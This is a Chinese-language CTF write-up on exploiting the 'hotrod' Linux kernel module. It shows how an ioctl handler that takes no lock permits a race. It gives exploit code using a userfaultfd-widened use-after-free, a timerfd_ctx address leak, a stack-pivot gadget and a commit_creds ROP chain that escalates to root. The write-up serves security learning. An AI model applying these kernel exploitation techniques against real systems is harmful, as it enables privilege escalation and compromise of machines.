#### 漏洞分析

从文件系统`init`文件可以找到漏洞模块`hotrod.ko`。

##### init_module

```c
__int64 init_module()
{
  unsigned int v0; // er12

  v0 = -1;
  _mutex_init(&hotrod_lock, "&hotrod_lock", &hotrod_dev);
  hotrod_dev = 0xFF;						// minor number
  qword_748 = (__int64)"hotrod";			// name
  qword_750 = (__int64)&hotrod_fops;		// file_operations
  if ( !(unsigned int)misc_register(&hotrod_dev) )
  {
    v0 = 0;
    printk(&unk_27F);
    printk(&unk_2B8);
  }
  return v0;
}
```

这里使用了`misc_register`向内核注册了杂项设备`hotrod`，其函数原型：

```c
int misc_register (	struct miscdevice * misc);
struct miscdevice  {
    int minor;
    const char *name;
    const struct file_operations *fops;
    struct list_head list;
    struct device *parent;
    struct device *this_device;
    const char *nodename;
    umode_t mode;
};
```

在内核中，每一个设备有一个主编号`major`和一个次编号`minor`；major用于内核识别与设备关联的驱动，minor用于驱动区分一个设备的多个驱动。

通过`file_operations`，找到驱动导出的`ioctl`函数`hotrod_ioctl`，其提供了四个cmd功能：allocate、free、edit、show。

##### Allocate

```c
 case 0xBAADC0DE:
      if ( allocated )                          // allocate
        return -1LL;
      allocated = 1;
      if ( hotrod )
      {
        if ( qword_7A8 )
          return -1LL;
      }
      if ( (unsigned __int64)(a3 - 224) > 0x10 )
        return -1LL;
      qword_7A8 = _kmalloc(a3, 3264LL);
      if ( !qword_7A8 )
        return -1LL;
      hotrod = a3;
      result = 0LL;
      break;
```

全局变量`allocated`限制只允许一次`allocate`操作，并且分配的堆大小限制在`0xe0 - 0xf0`之间。

##### Free

```c
    case 0xC001C0DE:
      if ( freed )
        return -1LL;
      freed = 1;
      if ( !hotrod || !qword_7A8 )              // free
        return -1LL;
      kfree(qword_7A8);
      result = 0LL;
      qword_7A8 = 0LL;
      hotrod = 0LL;
      break;
```

全局变量`freed`限制只允许一次`free`操作，且free之后将size和指针都置0。

##### Edit

```c
 case 0xDEADC0DE:
      if ( edited )
        return -1LL;                            // edit
      edited = 1;
      if ( !hotrod )
        return -1LL;
      if ( !qword_7A8 )
        return -1LL;
      copy_from_user(&v5, a3, 16LL);
      if ( v5 > hotrod )
        return -1LL;
      if ( v5 <= 0x7FFFFFFF )
      {
        copy_from_user(qword_7A8, v6, v5);
        return 0LL;
      }
      return 0LL;
```

从这里可以分析出用户数据结构：

```c
struct user_data{
	size_t size;
	unsigned char* data;
}
```

`edit`时严格检查了已分配的堆的大小和数据长度，不允许溢出。

##### Show

```c
case 0x1337C0DE:                            // show
      if ( showed )
        return -1LL;
      showed = 1;
      if ( !hotrod )
        return -1LL;
      if ( !qword_7A8 )
        return -1LL;
      copy_from_user(&v5, a3, 16LL);
      if ( v5 > hotrod )
        return -1LL;
      if ( v5 <= 0x7FFFFFFF )
        copy_to_user(v6, qword_7A8);
      return 0LL;
```

`show`时严格检查，不允许溢出读。

通过代码分析，由于严格地检查，似乎不存在`UAF`、`Double Free`、`Overflow`等漏洞。

##### Where is bug

这里涉及到`ioctl`的实现和内核的同步机制。

在低版本的内核中，ioctl使用了**Big Kernel Lock**（BKL）

```
ioctl() is one of the remaining parts of the kernel which runs under the Big Kernel Lock (BKL). In the past, the usage of the BKL has made it possible for long-running ioctl() methods to create long latencies for unrelated processes. 
```

BKL使得在SMP系统中，`ioctl`函数不允许抢占，造成了系统资源的浪费、降低了性能。因此引入了`unlocked_ioctl`、`compat_ioctl`函数。

新旧`ioctl`方法的差异在于

```
If a driver or filesystem provides an unlocked_ioctl() method, it will be called in preference to the older ioctl(). The differences are that the inode argument is not provided (it's available as filp->f_dentry->d_inode) and the BKL is not taken prior to the call. All new code should be written with its own locking, and should use unlocked_ioctl().
```

回顾`hotrod`代码，会发现它使用了`unlocked_ioctl`函数，但是却没有使用锁进行同步保护。

这就意味着在SMP环境下，如果创建多个线程，就有可能造成同时访问`hotrod_ioctl`相同代码（实质是全局变量），造成条件竞争漏洞，引起堆漏洞**UAF**，最终导致任意代码执行，提权。

#### 漏洞利用

##### 利用思路

利用线程A执行Allocate、Show操作泄漏内核地址，再利用Edit将UserSpace的Buffer复制到KernelSpace；

同时利用线程B执行Free释放堆块，接着再利用内核某种操作分配相同大小的内核结构体C，使得结构体C占据被释放的堆块。这样线程A的Edit操作有可能会修改结构体C，如果结构体C中包含函数指针，将有机会控制RIP。

实现这一利用思路的条件

* 结构体C大小在0xe0-0xf0（kmalloc-256）之间，且包含内核地址信息，函数指针（允许劫持Kernel RIP）
* 由于Allocate、Show等操作都只能执行一次，因此我们需要一个稳定的利用**条件竞争**的方式，提高成功的概率。

##### timerfd_ctx

在[UseFul Structure In Kernel Exploit](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)文章中提到这个结构体，其在slab机制中，由`kmalloc-256`-Cache分配，大小符合。

```c
struct timerfd_ctx {
	union {
		struct hrtimer tmr;
		struct alarm alarm;
	} t;
	ktime_t tintv;
	ktime_t moffs;
	wait_queue_head_t wqh;
	u64 ticks;
	int clockid;
	short unsigned expired;
	short unsigned settime_flags;	/* to show in fdinfo */
	struct rcu_head rcu;
	struct list_head clist;
	spinlock_t cancel_lock;
	bool might_cancel;
};
```

在`union`结构中，`hrtimer`结构体

```c
 /* 
 The hrtimer structure must be initialized by hrtimer_init()
 */
struct hrtimer {
	struct timerqueue_node		node;
	ktime_t				_softexpires;
	enum hrtimer_restart		(*function)(struct hrtimer *); // 当时间到时，执行该函数
	struct hrtimer_clock_base	*base;
	u8				state;
	u8				is_rel;
	u8				is_soft;
};
```

`alarm`结构体

```c
struct alarm {
	struct timerqueue_node	node;
	struct hrtimer		timer;
	enum alarmtimer_restart	(*function)(struct alarm *, ktime_t now);
	enum alarmtimer_type	type;
	int			state;
	void			*data;
};
```

这两个结构体中都满足上述需要的两个条件，即可以泄漏内核地址、堆地址；也可以重写函数指针控制程序执行流。

`timerfd_ctx`对象在执行`timerfd_create`时被创建，用于设置相对时间`expired`之后执行某任务，默认是`timerfd_tmrproc	`函数。

```c
static enum hrtimer_restart timerfd_tmrproc(struct hrtimer *htmr)
{
	struct timerfd_ctx *ctx = container_of(htmr, struct timerfd_ctx,
					       t.tmr);
	timerfd_triggered(ctx);
	return HRTIMER_NORESTART;
}

```

由`kfree_rcu`释放（再kfree之前，确认该`timer`没有再被使用。

##### 泄漏地址

根据上述利用`timerfd_ctx`结构体的思路，泄漏内核地址、堆地址，只需要先创建一个`timer`，再释放；再利用Allocate、Show功能即可。

`timerfd_ctx`结构体释放后的堆块：

```
gdb-peda$ x/8gx 0xffff88c40029b500
0xffff88c40029b500:	0xffff88c40029b500	0x0000000000000000
0xffff88c40029b510:	0x0000000000000000	0x00000007ea683642
0xffff88c40029b520:	0x00000007ea683642	0xffffffffafd02a00
0xffff88c40029b530:	0xffffffffb043e080	0x0000000000000000
```

偏移`0x00`处就是`timerfd_ctx`结构体的堆地址；偏移`0x18`处是`timerqueue_node.expires`，偏移`0x20`处是`htimer._softexpires`，其中timerqueue_node用于表示一个hrtimer节点，它在标准红黑树节点rb_node的基础上增加了expires字段，该字段和hrtimer中的*softexpires字段一起，设定了hrtimer的到期时间的一个范围，hrtimer可以在hrtimer.*softexpires至timerqueue_node.expires之间的任何时刻到期，我们也称timerqueue_node.expires为硬过期时间(hard)。

偏移`0x28`的值是一个默认的定时器处理函数`timerfd_tmrproc`，多次验证，它与Kernel加载基地址偏移固定`0x102a00`。

泄漏代码：

```c
	unsigned char* buffer = NULL;
	buffer = malloc(0x100);
	memset(buffer, 0, 0x100);

	unsigned long leak, kernel_addr, heap_addr;
	open_hotrod();
	create_timer(1);

	hotrod_alloc(0xf0);
	hotrod_show(0xf0, buffer);


	leak = ((unsigned long*)(buffer))[0x5];
	kernel_addr = leak - 0x102a00;
	heap_addr = ((unsigned long*)buffer)[0x0];

	printf("[*] Leak kernel_address: 0x%lx\n", kernel_addr);
	printf("[*] Leak heap_address: 0x%lx\n", heap_addr);
```

泄漏之后，需要利用条件竞争造成UAF，覆写`timerfd_ctx` 结构里的函数指针，为了提高条件竞争利用成功的概率，可以借助`userfaultfd`，使得PageFault交由UserSpace处理。	

##### 条件竞争-Userfaultfd

初始化`userfaultfd`

```c
unsigned long register_userfault(unsigned long fault_page, unsigned long fault_page_length)
{

	struct uffdio_api uapi;
	struct uffdio_register ur;

	// 1. create a userfaultfd
	unsigned long uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	uapi.api = UFFD_API;
	uapi.features = 0;

	if (ioctl(uffd, UFFDIO_API, &uapi) == -1)
	    errExit("ioctl-UFFDIO_API");

	// 2. register memory area
	ur.range.start = fault_page;
	ur.range.len = fault_page_length;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if(ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
		errExit("ioctl-UFFDIO_REGISTER");

	return uffd;
}
```

`handler`

```c
static void* handler(void* arg)
{
	static struct uffd_msg msg;  
	struct uffdio_copy uffd_copy;

	unsigned long uffd = (unsigned long) arg;
	puts("[*] Handler started !");

	// in loop to wait pagefault
	for(;;)
	{
		// See what poll() tells us about the userfaultfd. 
		struct pollfd pollfd;
		int nready, nread;
		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		nready = poll(&pollfd, 1, -1);

		if (nready == -1)
		       errExit("poll");


		nread = read(uffd, &msg, sizeof(msg));
		if (nread == 0) {
			printf("EOF on userfaultfd!\n");
			exit(EXIT_FAILURE);
		}

		char* fault_address = msg.arg.pagefault.address;
		if ((msg.event != UFFD_EVENT_PAGEFAULT) || (fault_address != map_addr)) {
			puts("[-] Unexpected Fault!");
			exit(-1);
		}


		printf("[*] Page Fualt At address: 0x%lx\n", fault_address);
		printf("[*] Mapped address: 0x%lx\n", map_addr);
		/*
		UAF here
		*/
		// free
		hotrod_free();
		//create second timer and don't free
		create_timer(0);
		// 这里需要注意 htimer.timerqueue_node.expires 和 htimer._softexpires都设置为一个过去的时间点，且相同（立即会调用回调函数）。
		((unsigned long*)(buffer))[0x3] = 0x0000000000000001;
		((unsigned long*)(buffer))[0x4] = 0x0000000000000001;
		((unsigned long*)(buffer))[0x5] = 0xdeadbeefdeadbeef;


		printf("[*] From address: 0x%lx\n", buffer);

		uffd_copy.dst = map_addr;	
		uffd_copy.src = buffer;							
		uffd_copy.len = PAGE_SIZE;
		uffd_copy.mode = 0;
		uffd_copy.copy = 0;

		if(ioctl(uffd, UFFDIO_COPY, &uffd_copy) == -1)
		{
			errExit("UFFDIO_COPY");
			exit(-1);
		}
		break;
	}

	return 0;
}
```

通过`edit`访问mmap分配的未实际映射的地址造成`PageFault`，在`hadler`中释放`hotrod`分配的堆块，再创建`timerfd_ctx`占据堆块；再控制mmap地址的内容，造成对`timerfd_ctx`的修改。

```c
map_addr = (char *) mmap(0xdead0000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

	unsigned long uffd = register_userfault(map_addr, PAGE_SIZE);
	pthread_t thr;

	// create handler thread
	pthread_create(&thr, NULL, handler, (void*)uffd);

	// Trigger PageFault
	hotrod_edit(0xf0, map_addr);

	// page handler
	pthread_join(thr, NULL);
```

成功控制Kernel RIP

```assembly
---[ end trace fcb6304bd4356056 ]---
RIP: 0010:0xdeadbeefdeadbeef
Code: Bad RIP value.
RSP: 0000:ffff8ed540087e58 EFLAGS: 00000006
RAX: deadbeefdeadbeef RBX: ffffffff9563e0a0 RCX: 0000000000000000
RDX: 00000000fffffffe RSI: 0000000000000000 RDI: ffff8c1cc029aa00
RBP: ffff8ed540087ea8 R08: 0000000000000000 R09: ffffffff9563e040
R10: 0000000000000000 R11: 0000000000000000 R12: 00000001cd5deaac
R13: ffffffff9563e080 R14: ffff8c1cc029aa00 R15: ffffffff9563e080
FS:  0000000001bd3880(0000) GS:ffffffff95632000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00000000006e4000 CR3: 000000000030a000 CR4: 00000000001006b0
Kernel panic - not syncing: Fatal exception in interrupt
Kernel Offset: 0x13e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
```

##### Stack Povit

由于开启了`SMEP`，无法`ret2user`，且目前只能修改RIP，不能任意地址写。所以需要通过`Stack Povit`方法为Ropchian创造条件，首先在`htimer`调用回调函数处下断点，看下上下文状态。

```assembly
[*] Leak timerfd_proc address: 0xffffffff96302a00
[*] Leak kernel_address: 0xffffffff96200000
[*] Leak heap_address: 0xffffa1304029ae00



[----------------------------------registers-----------------------------------]
RAX: 0xffffffff96302a00 --> 0xfa5b9c53e5894855 
RBX: 0xffffffff96a3e0a0 --> 0xffffa1304029ae00 (0xffffa1304029ae00)
RCX: 0x0 
RDX: 0xfffffffe 
RSI: 0x0 
RDI: 0xffffa1304029ae00 (0xffffa1304029ae00)
RBP: 0xffffade640003f68 --> 0xffffade640003f88 --> 0xffffade640003fa0 --> 0xffffade640003fb0 --> 0xffffade640003fd0 --> 0xffffade640003fe8 (--> ...)
RSP: 0xffffade640003f18 --> 0xffffffff9626f2ac --> 0xffff7a840fc085fa 
RIP: 0xffffffff96302a00 --> 0xfa5b9c53e5894855 
R8 : 0x0 
R9 : 0xffffffff96a3e040 --> 0x100000000 
R10: 0x0 
R11: 0x0 
R12: 0x6649b0fcc 
R13: 0xffffffff96a3e080 --> 0xffffffff96a3e040 --> 0x100000000 
R14: 0xffffa1304029ae00 (0xffffa1304029ae00)
R15: 0xffffffff96a3e080 --> 0xffffffff96a3e040 --> 0x100000000
EFLAGS: 0x6 (carry PARITY adjust zero sign trap interrupt direction overflow)
[-------------------------------------code-------------------------------------]
   0xffffffff963029f6:	call   0xffffffff96274fd0
   0xffffffff963029fb:	jmp    0xffffffff963029d8
   0xffffffff963029fd:	nop    DWORD PTR [rax]
=> 0xffffffff96302a00:	push   rbp
   0xffffffff96302a01:	mov    rbp,rsp
   0xffffffff96302a04:	push   rbx
   0xffffffff96302a05:	pushf  
   0xffffffff96302a06:	pop    rbx
[------------------------------------stack-------------------------------------]
0000| 0xffffade640003f18 --> 0xffffffff9626f2ac --> 0xffff7a840fc085fa 
0008| 0xffffade640003f20 --> 0x6649b0fcc 
0016| 0xffffade640003f28 --> 0x96271db6 
0024| 0xffffade640003f30 --> 0x6 
0032| 0xffffade640003f38 --> 0xffffffff96a3e040 --> 0x100000000 
0040| 0xffffade640003f40 --> 0x6 
0048| 0xffffade640003f48 --> 0x6649b0fcc 
0056| 0xffffade640003f50 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 hit Breakpoint 2, 0xffffffff96302a00 in ?? ()
gdb-peda$ x/30gx 0xffffa1304029ae00
0xffffa1304029ae00:	0xffffa1304029ae00	0x0000000000000000
0xffffa1304029ae10:	0x0000000000000000	0x0000000000000001
0xffffa1304029ae20:	0x0000000000000001	0xffffffff96302a00
0xffffa1304029ae30:	0xffffffff96a3e080	0x0000000000000000
0xffffa1304029ae40:	0x0000000000000000	0x0000000000000000
0xffffa1304029ae50:	0x0000000000000000	0x0000000000000000
0xffffa1304029ae60:	0x0000000000000000	0x0000000000000000
....
```

发现，在执行`timerfd_proc`时，`RDI`指向`htimer`结构体，这也和其函数原型是一致的（htimer作为参数）

```c
static enum hrtimer_restart timerfd_tmrproc(struct hrtimer *htmr)
{
	struct timerfd_ctx *ctx = container_of(htmr, struct timerfd_ctx,
					       t.tmr);
	timerfd_triggered(ctx);
	return HRTIMER_NORESTART;
}
```

由于`htimer`结构体的内容是可控的，所以可以用下面的Gadget完成stack povit

```assembly
mov esp, [rdi]; xxx; ret;
```

利用`ropper`搜索`vmlinux`的Gadgets

```
ropper --file ./vmlinux --nocolor > ./gadgets
```

找到符合`stack povit`的指令

```assembly
0xffffffff81027b86: mov esp, dword ptr [rdi]; lea rax, [rax + rsi*8]; ret; 
```

在`handler`中新建一个`map region`，用于`fake stack`

```c
		void* fake_stack = mmap((void*)0xccaa0000, PAGE_SIZE*4, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
		
		((unsigned long*)(buffer))[0x0] = (unsigned long)(fake_stack + 0x400);
		((unsigned long*)(buffer))[0x3] = 0x0000000000000001;
		((unsigned long*)(buffer))[0x4] = 0x0000000000000001;
		//((unsigned long*)(buffer))[0x5] = 0xdeadbeefdeadbeef;
		((unsigned long*)(buffer))[0x5] = povit_pointer;

		unsigned long* rop = (unsigned long*)(fake_stack + 0x400);
		*rop += 0xdeadbeefdeadbeef;
```

成功让内核执行`rop`

```assembly
--[ end trace a9565c28afb2df0d ]---
RIP: 0010:0xdeadbeefdeadbeef
Code: Bad RIP value.
RSP: 0018:00000000ccaa0408 EFLAGS: 00000006
RAX: ffffffffb6c27b86 RBX: ffffffffb743e0a0 RCX: 0000000000000000
RDX: 00000000fffffffe RSI: 0000000000000000 RDI: ffff98afc029a200
RBP: ffffb8fa80003f68 R08: 0000000000000000 R09: ffffffffb743e040
R10: 0000000000000000 R11: 0000000000000000 R12: 00000001783f07e0
```

##### 提权

之后，再继续构造ROP，执行`commit_creds(prepare_kernel_cred(0))`。

```c
		// commit_creds
		*rop++ = kernel_addr + (0xb689d);	// pop rdi; ret
		*rop++ = 0;
		*rop++ = kernel_addr + 0x53680; 		// prepare_kernel_cred
		*rop++ = kernel_addr + (0xffa5a);	// mov rdi, rax; call 0x2d1350; mov rax, -0x16; pop rbp; ret;
		*rop++ = 0;
		*rop++ = kernel_addr + (0x537d0);		// commit_creds
```

之后需要借助`swapgs_restore_regs_and_return_to_usermode `里的gadgets返回UserSpace

```assembly
0xffffffffac800cb0:	pop    r15
   0xffffffffac800cb2:	pop    r14
   0xffffffffac800cb4:	pop    r13
   0xffffffffac800cb6:	pop    r12

	.....
   
   0xffffffffac800ce5:	mov    rdi,cr3			[1]
   0xffffffffac800ce8:	jmp    0xffffffffac800d1c
   .....
   
   0xffffffffac800d1c:	or     rdi,0x1000		[2]
   0xffffffffac800d23:	mov    cr3,rdi
   0xffffffffac800d26:	pop    rax
   0xffffffffac800d27:	pop    rdi
   0xffffffffac800d28:	swapgs 
   0xffffffffac800d2b:	jmp    0xffffffffac800d50
   
   .....
   0xffffffffac800d50:	iretq  				[3]
```

`[1]->[2]->[3]`组成的gadgets设置CR3寄存器将page table转到Userspace，`swapgs`切换GS，`iretq`返回到用户空间。其需要栈上的参数

```
		    +-------------------+
            |        RIP        |
            +-------------------+
            |        CS         |
            +-------------------+
            |       RFLAGS      |           
            +-------------------+
            |        RSP        |
            +-------------------+
            |        SS         |
            +-------------------+
```

与之类似的`sysret`需要的参数是`RCX->user_rip`；`R11 -> user_rflags`。

对应的ROP

```c
		*rop++ = kernel_addr + (0x200cb0 + 0x35);		//kpti_trampoline
		*rop++ = 0x0;
		*rop++ = 0x0;
		*rop++ = get_root;
		*rop++ = user_cs;
		*rop++ = user_rflags;
		*rop++ = user_sp;
		*rop++ = user_ss;
```

这种方式`get_root`是UserSpace的函数，但是发现该函数里无法执行`execve`族的函数，否则kernel崩溃。

但是能够`read`，拿到flag。

```
/ # ./exp 
[*] Saved state
[*] Opened device.
[*] Create A timer and delete it done!
[*] Leak timerfd_proc address: 0xffffffff98702a00
[*] Leak kernel_address: 0xffffffff98600000
[*] Leak heap_address: 0xffff8ea9c029ac00
[*] Handler started !
[*] Page Fualt At address: 0xdead0000
[*] Mapped address: 0xdead0000
[*] From address: 0x6e4840
CUCTF{u@f_thr0uGh_uNl0cKeD_10ctL_r@c3}
```

由于不能执行`execve`族函数spawn一个root的shell，但是可以利用root权限执行一些操作，最常规的思路就是覆盖`mdoprobe_path`，利用bash添加一个root权限的用户。



#### 参考

[CUCTF 2020 Kernel Exploitation: Hotrod](https://syst3mfailure.io/hotrod)

[The new way ioctl](https://lwn.net/Articles/119652/)

[UseFul Structure In Kernel Exploit](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)

[高精度定时器（HRTIMER）的原理和实现](http://abcdxyzk.github.io/blog/2017/07/23/kernel-clock-6/)